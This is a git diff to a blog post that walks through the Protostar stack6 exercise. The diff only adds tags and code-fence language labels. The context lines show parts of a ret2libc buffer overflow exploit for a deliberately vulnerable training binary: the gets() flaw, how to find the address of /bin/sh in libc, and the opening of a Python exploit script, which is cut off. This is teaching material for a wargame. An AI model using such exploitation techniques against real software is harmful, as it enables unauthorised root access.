@@ -1,7 +1,7 @@
 ---
 title: "Protostar stack6 walkthrough"
 date: 2020-05-22
-tags: [protostar, stack6, walkthrough]
+tags: [buffer overflow, ret2libc, protostar, stack6, walkthrough]
 header:
   image: "/images/protostar/protostar.png"
 ---
@@ -18,7 +18,7 @@ It is strongly suggested you experiment with multiple ways of getting your code 
 This level is at /opt/protostar/bin/stack6
 
 #### Source code
-```
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -55,7 +55,7 @@ The aim is to get a root shell. Similar to the previous problem, we need to over
 
 ###### Vulnerability:
 
-`gets` is vulnerable function.
+`gets()` is vulnerable function.
 
 
 ###### Disassembly:
@@ -127,7 +127,7 @@ DEP, w^x, NX bit, ASLR prevent from executing code on stack in different ways. E
 
 
 Lets start by creating a simple binary
-```
+```c
 #include <stdlib.h>
 
 void main(){
@@ -228,7 +228,7 @@ user@protostar:/opt/protostar/bin$ strings -a -t x /lib/libc-2.11.2.so | grep "/
 address of /bin/sh = 0xb7e97000 + 0x11f3bf = 0xb7fb63bf
 
 Lets use these to craft the exploit.
-```
+```python
 import struct
 padding = 'AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV'
 call_system = struct.pack("I", 0xb7ecffb0)
